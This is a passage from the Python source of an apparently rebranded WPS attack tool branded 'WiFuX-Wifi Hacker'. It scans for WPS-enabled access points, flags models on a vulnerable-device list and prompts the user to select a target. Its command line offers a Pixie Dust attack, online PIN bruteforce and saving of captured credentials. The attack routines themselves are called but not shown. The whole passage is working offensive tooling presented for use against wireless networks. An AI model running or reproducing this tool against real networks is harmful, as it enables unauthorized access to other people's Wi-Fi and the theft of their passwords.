                .decode("utf-8", errors="replace")
            )

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[(-1)]["Model number"] = (
                codecs.decode(d, "unicode-escape")
                .encode("latin1")
                .decode("utf-8", errors="replace")
            )

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[(-1)]["Device name"] = (
                codecs.decode(d, "unicode-escape")
                .encode("latin1")
                .decode("utf-8", errors="replace")
            )

        cmd = "iw dev {} scan".format(self.interface)
        proc = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="replace",
        )
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile("BSS (\\S+)( )?\\(on \\w+\\)"): handle_network,
            re.compile("SSID: (.*)"): handle_essid,
            re.compile("signal: ([+-]?([0-9]*[.])?[0-9]+) dBm"): handle_level,
            re.compile("(capability): (.+)"): handle_securityType,
            re.compile("(RSN):\\t [*] Version: (\\d+)"): handle_securityType,
            re.compile("(WPA):\\t [*] Version: (\\d+)"): handle_securityType,
            re.compile("WPS:\\t [*] Version: (([0-9]*[.])?[0-9]+)"): handle_wps,
            re.compile(" [*] AP setup locked: (0x[0-9]+)"): handle_wpsLocked,
            re.compile(" [*] Model: (.*)"): handle_model,
            re.compile(" [*] Model Number: (.*)"): handle_modelNumber,
            re.compile(" [*] Device name: (.*)"): handle_deviceName,
        }
        for line in lines:
            if line.startswith("command failed:"):
                print("[!] Error:", line)
                return False
            else:
                line = line.strip("\t")
                for regexp, handler in matchers.items():
                    res = re.match(regexp, line)
                    if res:
                        handler(line, res, networks)
        networks = list(filter(lambda x: bool(x["WPS"]), networks))
        if not networks:
            return False
        else:
            networks.sort(key=lambda x: x["Level"], reverse=True)
            network_list = {i + 1: network for i, network in enumerate(networks)}

            def truncateStr(s, length, postfix="…"):
                """\n            Truncate string with the specified length\n            @s — input string\n            @length — length of output string\n"""
                if len(s) > length:
                    k = length - len(postfix)
                    s = s[:k] + postfix
                return s

            def colored(text, color=None):
                """Returns colored text"""
                if color:
                    if color == "green":
                        text = "[92m{}[00m".format(text)
                        return text
                    else:
                        if color == "red":
                            text = "[91m{}[00m".format(text)
                            return text
                        else:
                            if color == "yellow":
                                text = "[93m{}[00m".format(text)
                                return text
                            else:
                                return text
                else:
                    return text

            if self.vuln_list:
                print(
                    "Network marks: {1} {0} {2} {0} {3}".format(
                        "|",
                        colored("Possibly vulnerable", color="green"),
                        colored("WPS locked", color="red"),
                        colored("Already stored", color="yellow"),
                    )
                )
            print("Networks list:")
            print(
                "{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}".format(
                    "#", "BSSID", "ESSID", "Sec.", "PWR", "WSC device name", "WSC model"
                )
            )
            network_list_items = list(network_list.items())
            if args.reverse_scan:
                network_list_items = network_list_items[::(-1)]
            for n, network in network_list_items:
                number = f"{n})"
                model = "{} {}".format(network["Model"], network["Model number"])
                essid = truncateStr(network["ESSID"], 25)
                deviceName = truncateStr(network["Device name"], 27)
                line = "{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}".format(
                    number,
                    network["BSSID"],
                    essid,
                    network["Security type"],
                    network["Level"],
                    deviceName,
                    model,
                )
                if (network["BSSID"], network["ESSID"]) in self.stored:
                    print(colored(line, color="yellow"))
                else:
                    if network["WPS locked"]:
                        print(colored(line, color="red"))
                    else:
                        if self.vuln_list and model in self.vuln_list:
                            print(colored(line, color="green"))
                        else:
                            print(line)
            return network_list

    def prompt_network(self) -> str:
        os.system("clear")
        print(
            "[1;32m\n██╗    ██╗██╗███████╗██╗   ██╗██╗  ██╗\n██║    ██║██║██╔════╝██║   ██║╚██╗██╔╝\n██║ █╗ ██║██║█████╗  ██║   ██║ ╚███╔╝ \n██║███╗██║██║██╔══╝  ██║   ██║ ██╔██╗ \n╚███╔███╔╝██║██║     ╚██████╔╝██╔╝ ██╗\n ╚══╝╚══╝ ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝[0m\n\n[1;36m╭──────────────────────────────────────────────╮\n[1;36m│ [1;33m✦ [1;32mAuthor  [1;37m: MD Sakibur Rahman (MSR)          [1;36m│\n[1;36m│ [1;33m✦ [1;32mGitHub  [1;37m: msrofficial                      [1;36m│\n[1;36m│ [1;33m✦ [1;32mFacebook[1;37m: sakibur.msr                      [1;36m│\n[1;36m│ [1;33m✦ [1;32mWebsite [1;37m: https://msrsakibur.netlify.app   [1;36m│\n[1;36m╰──────────────────────────────────────────────╯[0m\n         [1;35m★ [1;32mVersion [1;37m: [1;32mv2.0 [1;33m[Target Mode][0m\n\n[1;37m[[1;31m![1;37m] [1;33mUpdate: Type [1;32mwifux update[1;33m in termux[0m\n[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m\n"
        )
        networks = self.iw_scanner()
        if not networks:
            print("[[1;31mi[1;37m] No WPS networks found!")
            print("[[1;33mi[1;37m] Turn on yout hotspot if turned off!")
            print("[[1;33mi[1;37m] Turn on wifi for some moment then turn off!")
            print("[[1;33mi[1;37m] Turn off location if turned on!")
            for i in range(4, (-1), (-1)):
                sys.stdout.write(
                    "\r[[1;33m+[1;37m] Restarting in [[1;33m"
                    + str(i + 1)
                    + "[1;37m] second!"
                )
                time.sleep(1)
                sys.stdout.flush()
            return self.prompt_network()
        else:
            while True:
                try:
                    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    networkNo = input(
                        "[[1;33m?[1;37m] Select target (press Enter to refresh): "
                    )
                    if networkNo.lower() in ["r", "0", ""]:
                        return self.prompt_network()
                    else:
                        if int(networkNo) in networks.keys():
                            return networks[int(networkNo)]["BSSID"]
                        else:
                            raise IndexError
                except Exception:
                    print("[[1;31m![1;37m] Invalid number")
                    pass


def ifaceUp(iface, down=False):
    if down:
        action = "down"
    else:
        action = "up"
    cmd = "ip link set {} {}".format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False


def die(msg):
    sys.stderr.write(msg + "\n")
    sys.exit(1)


def usage():
    return "\nWiFuX-Wifi Hacker By MSR (modified).\n\n%(prog)s <arguments>\n\nRequired arguments:\n    -i, --interface=<wlan0>  : Name of the interface to use\n\nOptional arguments:\n    -b, --bssid=<mac>        : BSSID of the target AP\n    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)\n    -K, --pixie-dust         : Run Pixie Dust attack\n    -B, --bruteforce         : Run online bruteforce attack\n\nAdvanced arguments:\n    -d, --delay=<n>          : Set the delay between pin attempts [0]\n    -w, --write              : Write AP credentials to the file on success\n    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)\n    -X, --show-pixie-cmd     : Always print Pixiewps command\n    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']\n    --iface-down             : Down network interface when the work is finished\n    -l, --loop               : Run in a loop\n    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays\n    -v, --verbose            : Verbose output\n\nExample:\n    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K\n"


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="WiFuX-Wifi Hacker By MSR (modified).",
        epilog="Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K",
    )
    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        required=True,
        help="Name of the interface to use",
    )
    parser.add_argument("-b", "--bssid", type=str, help="BSSID of the target AP")
    parser.add_argument(
        "-p",
        "--pin",
        type=str,
        help="Use the specified pin (arbitrary string or 4/8 digit pin)",
    )
    parser.add_argument(
        "-K", "--pixie-dust", action="store_true", help="Run Pixie Dust attack"
    )
    parser.add_argument(
        "-F",
        "--pixie-force",
        action="store_true",
        help="Run Pixiewps with --force option (bruteforce full range)",
    )
    parser.add_argument(
        "-X",
        "--show-pixie-cmd",
        action="store_true",
        help="Always print Pixiewps command",
    )
    parser.add_argument(
        "-B", "--bruteforce", action="store_true", help="Run online bruteforce attack"
    )
    parser.add_argument(
        "-d", "--delay", type=float, help="Set the delay between pin attempts"
    )
    parser.add_argument(
        "-w",
        "--write",
        action="store_true",
        help="Write credentials to the file on success",
    )
    parser.add_argument(
        "--iface-down",
        action="store_true",
        help="Down network interface when the work is finished",
    )
    parser.add_argument(
        "--vuln-list",
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + "/vulnwsc.txt",
        help="Use custom file with vulnerable devices list",
    )
    parser.add_argument("-l", "--loop", action="store_true", help="Run in a loop")
    parser.add_argument(
        "-r",
        "--reverse-scan",
        action="store_true",
        help="Reverse order of networks in the list of networks. Useful on small displays",
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()
    if sys.hexversion < 3170544:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")
    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))
    while True:
        try:
            if not args.bssid:
                try:
                    with open(args.vuln_list, "r", encoding="utf-8") as file:
                        vuln_list = file.read().splitlines()
                except FileNotFoundError:
                    vuln_list = []
                scanner = WiFiScanner(args.interface, vuln_list)
                if not args.loop:
                    print(
                        "[*] BSSID not specified (--bssid) — scanning for available networks"
                    )
                args.bssid = scanner.prompt_network()
            if args.bssid:
                companion = Companion(
                    args.interface, args.write, print_debug=args.verbose
                )
                if args.bruteforce:
                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                else:
                    companion.single_connection(
                        args.bssid,
                        args.pin,
                        args.pixie_dust,
                        args.show_pixie_cmd,
                        args.pixie_force,
                    )
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if (
                    input(
                        "\n[?] Exit the script (otherwise continue to AP scan)? [N/y] "
                    ).lower()
                    == "y"
                ):
                    print("Aborting…\nStay With\nMSR")
                    break
                args.bssid = None
            else:
                print("\nAborting…\nStay With\nMSR")
                break
    if args.iface_down:
        ifaceUp(args.interface, down=True)
